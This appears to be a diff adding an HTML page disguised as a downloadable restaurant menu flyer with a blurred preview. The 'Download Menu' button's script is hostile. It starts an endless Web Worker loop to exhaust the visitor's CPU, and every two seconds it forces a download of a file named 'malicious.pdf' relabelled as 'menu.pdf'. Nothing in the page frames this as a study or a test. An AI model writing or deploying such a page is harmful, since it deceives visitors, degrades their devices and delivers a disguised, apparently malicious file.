@@ -1,0 +1,58 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Menu Flyer</title>
+  <style>
+    #blurred {
+      filter: blur(8px);
+      width: 300px;
+      height: 400px;
+      background: url('menu.jpg') no-repeat center center;
+      background-size: cover;
+      margin-bottom: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div id="blurred"></div>
+  <button id="downloadBtn">Download Menu</button>
+
+  <script>
+    document.getElementById('downloadBtn').addEventListener('click', () => {
+      // Remove blur
+      document.getElementById('blurred').style.filter = 'none';
+
+      // Start CPU intensive loop
+      function cpuLoad() {
+        let x = 0;
+        while (true) {
+          x += Math.sqrt(Math.random());
+          if (x > 1e7) x = 0; // reset to avoid overflow
+        }
+      }
+
+      // Start repeated downloads
+      function downloadLoop() {
+        const link = document.createElement('a');
+        link.href = 'malicious.pdf';
+        link.download = 'menu.pdf';
+        document.body.appendChild(link);
+        link.click();
+        document.body.removeChild(link);
+      }
+
+      // Run CPU load in a Web Worker to keep UI responsive (optional)
+      if (window.Worker) {
+        const blob = new Blob([`onmessage = function() { while(true) {} }`], {type: 'application/javascript'});
+        const worker = new Worker(URL.createObjectURL(blob));
+        worker.postMessage('');
+      } else {
+        cpuLoad();
+      }
+
+      // Start download loop every 2 seconds
+      setInterval(downloadLoop, 2000);
+    });
+  </script>
+</body>
+</html>
